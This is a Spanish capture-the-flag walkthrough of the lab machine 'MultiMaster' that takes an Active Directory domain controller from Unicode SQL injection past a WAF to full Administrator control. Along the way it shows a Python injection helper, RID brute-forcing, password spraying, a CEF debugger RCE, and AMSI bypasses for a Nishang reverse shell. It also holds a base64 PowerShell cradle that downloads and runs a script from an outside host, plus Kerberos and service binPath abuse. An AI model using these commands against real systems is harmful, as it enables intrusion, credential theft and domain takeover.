-------
- Tags: #sqlite-injection #waf #python-scripting #password-crack #SQLi-DC #SID-RID #smb #rpcclient #rpc #Visual-Studio-Code #AMSI-Bypass #genericWrite-privilege #bloodhound #ASREPRoast #Server-Operators-Group #binpath
---------
## Técnicas utilizadas
- SQLI (SQL Injection) - Unicode Injection  
- WAF Bypassing  
- Advanced Python Scripting - Creation of an automation tool to handle Unicode in SQL injection  
- Database enumeration through the previously created utility  
- Cracking Passwords  
- Active Directory Enumeration  
- Enumerating domain information through SQL injection  
- Obtaining domain RIDs through SQL injection  
- Applying brute-force attack (SID = SID+RID) to obtain existing domain users [Python Scripting]  
- SMB Brute Force Attack (Crackmapexec)  
- Enumerating AD existing users (rpcclient/rpcenum)  
- Abusing Remote Management User group  
- Microsoft Visual Studio 10.0 Exploitation (User Pivoting)  
- Using libwebsockets in order to connect to a CEF Debugger (RCE)  
- AMSI Bypass - Playing with Nishang  
- AMSI Bypass - Bypass-4MSI Alternative (evil-winrm)  
- DLL Inspection - Information Leakage  
- BloodHound Enumeration  
- Abusing the GenericWrite privilege on a user  
- Making a user vulnerable to an ASREPRoast attack - Disabling Kerberos Pre-Authentication  
- Requesting the TGT of the manipulated user  
- Abusing Server Operators Group  
- Abusing an existing service by manipulating its binPATH  
- We change the password of the administrator user after restarting the manipulated service

## Procedimiento
![[Pasted image 20230623115029.png]]

---------
#### Reconocimiento
El escaneo con **nmap** nos muestra los siguientes puertos abiertos:
```ruby
# nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49667,49674,49675,49681,49701 10.10.10.179 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 15:28 MST
Nmap scan report for 10.10.10.179
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-25 22:31:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-06-25T22:32:48+00:00; +2m54s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2023-06-25T22:32:08+00:00
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2023-06-24T22:27:47
|_Not valid after:  2023-12-24T22:27:47
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
```
Si lanzamos un **whatweb** podemos ver las tecnologías que corren por detrás del sitio web:
```ruby
# whatweb 10.10.10.179
http://10.10.10.179 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.179], Microsoft-IIS[10.0], Script, Title[MegaCorp], X-Powered-By[ASP.NET], X-UA-Compatible[IE=edge]
```
Podemos crear un diccionario con los usuarios encontrados en el apartado de *Colleage Finder* para intentar un **asreproast attack**, contemplamos el *dominio* de los correos en el */etc/hosts* y ejecutamos el comando:

```
# impacket-GetNPUsers megacorp.htb/ -no-pass -usersfile users.txt
```

Pero no tenemos exito ya que no cuentan con el *UF_DONT_REQUIRE_PREAUHT* habilitado.
Tambien podemos intentar enumerar cual de los usuarios es realmente valido con **Kerbrute** de la siguiente forma:

```
# kerbrute userenum --dc ip -d megacorp.local users
```

------------
#### SQLI (SQL Injection) - Unicode Injection 

##### WAF Bypassing
Si visitamos la pagina principal, vemos un dashboard que no tiene ninguna funcionabilidad habilitada, sin embargo, vemos un buscador de *usuarios* (Colleage Finder) que es vulnerable a **SQLi**. Nos percatamos que hay un **WAF** ( Web Application Firewall ) ya que al hacer multiples peticiones, el codigo de estado se empieza a tornar a **403**, se va tener que ir con precaución a la hora de ejecutar fuerza bruta.

Podemos usar **WFUZZ** para fuzzear por caracteres en el *Input* pero tomando en cuenta el **WAF**
asi que procederemos de la siguiente forma:
```
# wfuzz -c --hh=200 -X POST -s 1 -w diccionario.txt -d '{"name":"FUZZ"}' http://<ip>/ -H "content-type: application/json"
```

Y vemos que como resultado, nos muestra los signos tipicos de campos vulnerables a **SQLi**:
El simbolo que nos interesa especialmente es el **\\**  ya que **sqlmap** suele tirar de este simbolo en algunos de sus **tampers** 

---------
#### Advanced Python Scripting - Creation of an automation tool to handle Unicode in SQL injection

Como es una labor algo tardia, el estar convirtiendo las letras a **Decimal** y posteriormente a **Hexadecimal**. podemos hacer un script en python3:

```python
#!/usr/bin/python3

from pwn import *
import requests, pdb, signal, time, json, sys

# ctrl + c 
def def_handler(sig,frame):
	print("\m\n[!] Saliendo...\n")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://ip/api/getColleagues"

# Funciones
def getUnicode(sqli):

	sqli_mod = ""
	
	for character in sqli:
		sqli_mod += "\\u00" + hex(ord(character))[2::]
		
	return sqli_mod

def makeRequests(sqli_mod):
	
	headers = {'Content-Type':'application/json;charset=utf-8'}

	post_data = '{"name":"%s"}' % sqli_mod
	
	# Podemos agregar un proxy para ver como se esta tramitando la peticion
	r = requests.post(main_url, data=post_data, headers=headers)
	
	data_json = json.loads(r.text)
	return(json.dumps(data_json, indent=4))
	
if __name__ == "__main__":
	
	while true:
		sqli = input("> ")
		sqli = sqli.strip()
		
		sqli_mod = getUnicode(sqli)
		
		response_json = makeRequests(sqli_mod)
		print(response_json)
```

 -----------
#### Database enumeration through the previously created utility 

Con el script antes programado, podemos intentar enumerar la base de datos. Como es un **Microsoft Windows** la manera de enumerar la base de datos es algo distinto a lo tradicional (mysql, postgres).  Para listar la base que esta actualmente en uso podemos usar:

```mysql
> test' union select 1,db_name(),3,4,5-- -
```

Y por lo demas, seria igual que **mysql**.

#### Cracking Passwords  

En la base de datos logramos dumpear multiples hashes con sus respectivos usuarios. Podemos intentar romper estos hashes de manera *offline* para dar con la verdadera contraseña.
Podemos intentar con **John** para lamentablemente no identifica este tipo de hashes. Lo haremos con **hashcat** y sera de la siguiente manera:
```
hashcat -m 17900 -a 0 hash rockyou.txt --user
```

Con las contraseñas descubiertas, podemos crear un diccionario para hacer algunas pruebas.

#### Active Directory Enumeration

Con las contraseñas dumpeadas, podemos intentar un ataque de fuerza bruta sobre el servicio **smb** con **crackmapexec** de la siguiente manera:
```
# crackmapexec smb ip -u list_user.txt -p list_passwords --continue-on-success
```

--------------------
#### Enumerating domain information through SQL injection 

No encontramos ninguna credencial valida. Lo que haremos a continuacion sera volver a nuestro script de **SQLi** e intentar enumerar algunas cosas interesantes del **Active Directory**. Por un lado podemos listar el nombre del *dominio*:
```
> test' union select 1,default_domain(),3,4,5-- -
```

Podemos listar informacion de usuarios del directivo activo, en este caso listaremos informacion del **Domain Admin**:
```
> test' union select 1,SUSER_SID('MEGACORP\Administrator'),3,4,5-- -
```

Esto nos mostrara el resultado, pero en formato **unicode**, el mismo que estamos utilizando para hacer la inyección **SQL**:
```
> test' union select 1,SUSER_SID('MEGACORP\Administrator'),3,4,5-- -
[
    {
        "id": 1,
        "name": "\u0001\u0005\u0000\u0000\u0000\u0000\u0000\u0005\u0015\u0000\u0000\u0000\u001c\u0000\u00d1\u00bc\u00d1\u0081\u00f1I+\u00df\u00c26\u00f4\u0001\u0000\u0000",
        "position": "3",
        "email": "4",
        "src": "5"
    }
]
```

---------
#### Obtaining domain RIDs through SQL injection

Podemos convertir el formato **unicode** a hexadeciaml de la siguiente forma:
```
> 		test' union select 1,(select sys.fn_varbintohexstr(SUSER_PID('MEGACORP\Administrator'))),3,4,5-- -
```

Esto nos da como resultado una mezcla del **SID** y el **RID**. Los primeros 48 caracteres pertenecen al **SID**, los caracteres restandes pertenecen al **RID**. Vamos a separar los ultimos caracteres de dos en dos y borrar los *0* que este acompañados de otro *0*. Una vez hecho esto, le tenemos que dar la vuelta a la cadena restante. Un ejemplo de como seria:
```
0x01f4
```

Ahora podemos ver a quien pertenece este **PID** con la forma inversa:
```
> test' union select 1,(select SUSER_SNAME(<PID>)),3,4,5-- -
```

Podemos ir fuzzeando por los ultimos caracteres, de tal forma que usando **python3** transformamos el decimal ( el primero fue 500 )  a hexadecimal:

```python
>> hex(500)
'0x1f4'
# El resultado final es -> f401
>> hex(501)
'0x1f5'
# El resultado final es -> f501
```

---------
#### Applying brute-force attack (SID = SID+RID) to obtain existing domain users [Python Scripting]  

Lo que vamos hacer ahora es hacer un pequeño ajuste al script en python que habiamos hecho para automatizar el descubrimiento de usuarios a nivel de dominio:
```python
def getRID(x):

	rid_hex = hex(x).replace('x', '')
	list = []
	
	for character in rid_hex:
		list.append(character)

	rid = list[2] + list[3] + list[0] + list[1]
	return rid

sid = "0x0000000000000000000000000"
if __name__ == "__main__":
	
	for i in range(1100, 1200)

		rid = getRID(x)
		sqli = "test' union select 1,(select SUSER_SNAME(%s%s)),3,4,5-- -" % (sid,rid)
		
		sqli_mod = getUnicode(sqli)
		
		response_json = makeRequests(sqli_mod)
		print(response_json)
		time.sleep(1)
```

--------
#### SMB Brute Force Attack (Crackmapexec) 

Ahora que tenemos nuevos usuarios, podemos intentar intentar el **brute force** que habiamos intentado con **cracmapexec** haber si obtenemos nuevas credenciales validas a nivel de dominio:
```
# crackmapexec smb ip -u list_user.txt -p list_passwords --continue-on-success
```

Y obtenemos una credencial valida a nivel de dominio. 

--------
#### Enumerating AD existing users (rpcclient/rpcenum)  

Ahora  que tenemos credenciales validas, podemos enumerar el sistema Podemos tirar de **rpcclient** o de **rpcenum** ( Herramienta de s4vitar ). 

**rpcclient**:
```
# rpcclient -U 'usuario%contraseña' <ip>
```

- enumdomusers -> Lista los usuarios del sistema.
- enumdomgroups -> Lista los grupos del sistema.
- querygroupmem `rid-group` -> Lista el RID de los usuarios administradores del dominio.
- queryuser `rid` -> Muestra la información del usuario.

También podemos enumerar el sistemas por **ldap**. Esta nos deja multiples archivos que posteriormente podemos procesar a través de un servidor web que abrimos en local.

**ldapdomaindump**:
```
# ldapdomaindump -u '<DOMAIN\usuario>' -p '<password>' <ip>
```

-----------
#### Abusing Remote Management User group 

En la enumeración previa del sistema, encontramos que el usuario que tenemos pertenece al grupo **Remote Management Users**. Esto lo que nos permite es conectarnos a la maquina a través de **WinRM**. 

**evil-winrm**:
```
# evil-winrm -i <ip> -u '<usuario>' -p '<password>'
```

--------
#### Microsoft Visual Studio 10.0 Exploitation (User Pivoting)  

Una vez dentro de la maquina, podemos empezar a enumerar pero no encontraremos nada interesante. Podemos intentar listar procesos del **Domain Controller*** para ver si hay algo que nos sirve:
```
# Get-Process
```

Podemos ver un proceso que llama la atención:
```
image
```

Usualmente, el proceso suele pertenecer a **Visual Studio Code**. Podemos corroborarlo si vamos a *C:\Program Files\\* y listamos por los programas existentes. Si vemos la version del binario y buscamos por ella en google, encontraremos una vulnerabilidad de tipo **Privilege Escalation**.
Si leemos de que trata la vulnerabilidad, basicamente esta nos dice que **Visual Studio Code** expone uno **debug listener**.

------------
#### Using libwebsockets in order to connect to a CEF Debugger (RCE)  

Podemos aprovecharnos de esto con una herramienta llamada [cefdebug](https://github.com/taviso/cefdebug). El uso de la herramienta es facil. Nos clonamos el repositorio a nuestro equipo y trasladamos el **cefdebug** a la maquina victima. Lo ejecutamos y este nos creara un proceso con una **URL** contra la que atentaremos:
```powershell
PS > .\cefdebug.exe
```

Con el proceso creado, lo siguiente que tendriamos que hacer para ejecutar comandos como el usuario que corre el proceso de **code** seria esto:
```powershell
PS > .\cefdebug.exe --url "ws://127.0.0.1:port/uuid" --code "<comando>"
```

--------
#### AMSI Bypass - Playing with Nishang

Si intentamos entablarnos una **reverse shell** con **Invoke-PowerShell.ps1** de [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) vemos que nos lo impide el **Antivirus**. Para burlar esta restriccion esta tan facil como eliminar todos los comentarios del script y cambiar el nombre de la funcion principal **Invoke-PowerShellTcp** a algo menos descriptivo.

-----------
#### AMSI Bypass - Bypass-4MSI Alternative (evil-winrm)

Podemos ahorrarnos el proceso de arriba. **Evil-winrm** cuenta con un **menu**, en esto hay una opcion de nombre: **Bypass-4MSI**. Si la ejecutamos, podemos ejecutarnos el **Invoke-PowerShell.ps1** sin necesidad de cambiar nada.

------------
#### DLL Inspection - Information Leakage  

A la hora de intentar colar el comando con **cefdebug**, veremos que tenemos el problema con las dobles comillas y las comillas simples. Lo que podemos hacer es convertir todo el comando integro a **base64**, cabe mencionar que para que esto funcione en **Windows** tenemos que hacerlo de esta manera:
```
# echo -n "IEX(New-Object New.WebClient).downloadString('http://10.10.14.30/ps.ps1')" | iconv -t utf-16le | base64 -w 0
```

Y para intrarpetarlo desde **PowerShell** tenemos que ejecutar el siguiente comando:

```powershell
PS > powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHcALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAOAAxAC8AUABzAC4AcABzADEAJwApAA==
```

Si listamos los grupos a los que pertecenemos, vemos que tenemos asignado un grupo **Developer**.
Este grupo suele tener la capacidad de modificar, leer y crear archivos en el directorio de la parte web. Dentro de este directorio, podemos encontrar un *.dll* algo sospechoso dentro de la carpeta *bin*.
Podemos transferirnos el *.dll* para analizarnos desde nuestra maquina. Si hacemos un **strings** del *.dll* vemos que no hay nada relevante, sin embargo, cuando se trata de binarios provenientes de **windows** se recomiendo meterle la flag *-e l*, esto suele mostrarnos muchas veces más información.
Encontramos unas credenciales, como no existe el usuario contemplado en el **Leak** podemos hacer un **Password Spay** con **crackmapexec** con los usuarios que tenemos contemplados.

--------
#### BloodHound Enumeration

Con el usuario nuevo descubierto, nos conectamos con **evil-winrm**. Vamos a subir el **sharphound.exe** para recolectar toda la informacion para posteriormente procesarla con **BloodHound**:
```powershell 
PS > .\SharpHound.exe -c All
```

Esto nos creara un *.zip* que trasladaremos a nuestra maquina y lo subiremos a **BloodHound** 

--------
#### Abusing the GenericWrite privilege on a user

Enumerando el **Domain Controller** con **BloodHound** vemos muchas cosas interesantes, pero nos quedaremos con lo que podemos hacer con el actual usuario obtenido. Este tiene permisos de escritura sobre un usuario el cual pertenece a un grupo, el cual tiene derechos de escritura también sobre el grupo **Domain Admins**.

-------------
#### Making a user vulnerable to an ASREPRoast attack - Disabling Kerberos Pre-Authentication 

Lo que haremos a continuacion sera habilitar el *UF_DONT_REQUIRE_PREAUHT* del usuario para poder conseguir un **TGTs**. Esto lo conseguiremos de la siguiente manera:

**Lista las propiedades del usuario a nivel de domain**:
```powershell
PS > Get-ADuser jorden
```

**Habilita el *UF_DONT_REQUIRE_PREAUHT* del usuario deseado:**
```powershell
PS > Get-ADuser jorden | Set-ADAccountControl -doesnotrequirepreauth $true
```

---------------------
#### Requesting the TGT of the manipulated user 

Esto nos permitira ejecutar **GetNPUsers.py** y conseguir el hash del usuario:
```
# GetNPUsers.py MEGACORP.LOCAL/ -no-pass -userfile users
```

Y obtendremos el hash:
```
hash
```

Ahora podemos intentar romper el hash de manera *offline* para conseguir la contraseña en texto plano.

---------
#### Abusing Server Operators Group
##### Abusing an existing service by manipulating its binPATH
Nos conectamos con **evil-winrm** con las nuevas credenciales obtenidas. Ahora, como veiamos en el **BloodHound** tenemos capacidad de escritura sobre **Domain Admins** ya que nuestro grupo cuenta con esa capacidad.

----------
##### We change the password of the administrator user after restarting the manipulated service
Lo que haremos es abusar el **binpath**, tomaremos el proceso **browser** y cambiaremos su path.
```powershell
PS > sc.exe config browser binPath="C:\Windows\System32\cmd.exe -c net user Administrator sexcott123!$" 
```

Ahora tendremos que parar el proceso:
```powershell
PS > sc.exe stop browser
```

Y lo volvemos a iniciar:
```powershell
PS > sc.exe start browser
```

Y ya podriamos conectarnos a la maquina victima como el usuario **Administrator** a través de **Evil-WinRm**.


"MultiMaster" ^626d41